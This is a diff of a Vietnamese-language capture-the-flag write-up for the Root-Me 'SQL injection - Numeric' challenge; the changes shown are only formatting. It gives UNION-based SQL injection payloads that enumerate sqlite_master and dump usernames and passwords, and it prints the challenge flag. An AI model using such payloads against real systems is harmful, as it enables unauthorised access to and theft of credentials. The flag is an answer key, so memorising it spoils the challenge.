@@ -2,36 +2,36 @@
 
 **Challenge:** [SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
 
-![Shape Description automatically generated with low confidence](./media/image1.png){width="6.5in" height="1.5520833333333333in"}
+<img src="./media/image1.png" style="width:6.5in;height:1.55208in" alt="Shape Description automatically generated with low confidence" />
 
 Thử bypass qua login thì không thể thực hiện được.
 
-![Shape Description automatically generated with medium confidence](./media/image2.png){width="6.5in" height="1.7027777777777777in"}
+<img src="./media/image2.png" style="width:6.5in;height:1.70278in" alt="Shape Description automatically generated with medium confidence" />
 
-Kiểm tra các thẻ khác trong Home vì nhận thấy điều đặc biệt rằng, 3 link này đều dẫn đến **action=news&news_id=\[x\].** Thử xóa id của news thì phát hiện database bị lỗi:
+Kiểm tra các thẻ khác trong Home vì nhận thấy điều đặc biệt rằng, 3 link này đều dẫn đến **action=news&news\_id=\[x\].** Thử xóa id của news thì phát hiện database bị lỗi:
 
-![Graphical user interface, text, application Description automatically generated](./media/image3.png){width="6.5in" height="2.359027777777778in"}
+<img src="./media/image3.png" style="width:6.5in;height:2.35903in" alt="Graphical user interface, text, application Description automatically generated" />
 
-Database của server là SQLite3. Tương tự bài SQL Injection -- String, ta thực hiện inject nó để tìm ra admin. Ta dò được số cột là 3:
+Database của server là SQLite3. Tương tự bài SQL Injection – String, ta thực hiện inject nó để tìm ra admin. Ta dò được số cột là 3:
 
-![Graphical user interface, text, application Description automatically generated](./media/image4.png){width="6.5in" height="1.7777777777777777in"}
+<img src="./media/image4.png" style="width:6.5in;height:1.77778in" alt="Graphical user interface, text, application Description automatically generated" />
 
-Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,1,1 from sqlite_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,1%20from%20sqlite_master)
+Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news\_id=1 union select 1,1,1 from sqlite\_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,1%20from%20sqlite_master)
 
 Ta dò được có 2 bảng users và news:
 
-![Graphical user interface, text, application Description automatically generated](./media/image5.png){width="6.5in" height="1.8888888888888888in"}
+<img src="./media/image5.png" style="width:6.5in;height:1.88889in" alt="Graphical user interface, text, application Description automatically generated" />
 
-Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,1,name from sqlite_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,name%20from%20sqlite_master)
+Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news\_id=1 union select 1,1,name from sqlite\_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,name%20from%20sqlite_master)
 
 Tương tự bài String, ta show ra được username và password của users:
 
-![Graphical user interface, text, application Description automatically generated](./media/image6.png){width="6.5in" height="2.3in"}
+<img src="./media/image6.png" style="width:6.5in;height:2.3in" alt="Graphical user interface, text, application Description automatically generated" />
 
-Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,username,password from users](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,username,password%20from%20users)
+Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news\_id=1 union select 1,username,password from users](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,username,password%20from%20users)
 
 Login vào thành công:
 
-![Graphical user interface, text, application Description automatically generated](./media/image7.png){width="6.5in" height="1.957638888888889in"}
+<img src="./media/image7.png" style="width:6.5in;height:1.95764in" alt="Graphical user interface, text, application Description automatically generated" />
 
 **Flag:** aTlkJYLjcbLmue3
